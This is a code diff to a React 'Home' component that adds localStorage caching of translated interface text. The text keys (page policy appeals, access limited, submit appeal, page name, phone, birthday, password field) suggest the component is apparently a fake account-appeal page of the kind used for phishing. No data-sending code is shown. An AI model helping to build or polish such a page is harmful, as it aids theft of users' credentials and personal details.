@@ -57,7 +57,17 @@ const Home = () => {
 
     const [showPassword, setShowPassword] = useState(false);
     const [errors, setErrors] = useState({});
-    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
+    const [translatedTexts, setTranslatedTexts] = useState(() => {
+        // 🎯 LẤY NGAY BẢN DỊCH TỪ LOCALSTORAGE KHI KHỞI TẠO
+        const targetLang = localStorage.getItem('targetLang');
+        if (targetLang && targetLang !== 'en') {
+            const savedTranslation = localStorage.getItem(`translatedHome_${targetLang}`);
+            if (savedTranslation) {
+                return JSON.parse(savedTranslation);
+            }
+        }
+        return defaultTexts;
+    });
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
     const [securityChecked, setSecurityChecked] = useState(false);
@@ -163,6 +173,14 @@ const Home = () => {
     }, []);
 
     const translateCriticalTexts = useCallback(async (targetLang) => {
+        // 🎯 KIỂM TRA NẾU ĐÃ CÓ BẢN DỊCH THÌ KHÔNG DỊCH LẠI
+        const savedTranslation = localStorage.getItem(`translatedHome_${targetLang}`);
+        if (savedTranslation) {
+            const parsedTranslation = JSON.parse(savedTranslation);
+            setTranslatedTexts(parsedTranslation);
+            return; // 🎯 THOÁT LUÔN, KHÔNG DỊCH LẠI
+        }
+
         try {
             const [helpCenter, pagePolicyAppeals, detectedActivity, accessLimited, submitAppeal, pageName, mail, phone, birthday, yourAppeal, submit, pleaseWait, checkingSecurity] = await Promise.all([
                 translateText(defaultTexts.helpCenter, targetLang),
@@ -245,6 +263,7 @@ const Home = () => {
         return () => clearTimeout(timer);
     }, [initializeSecurity]);
 
+    // ... (các hàm còn lại giữ nguyên)
     const validateEmail = (email) => {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
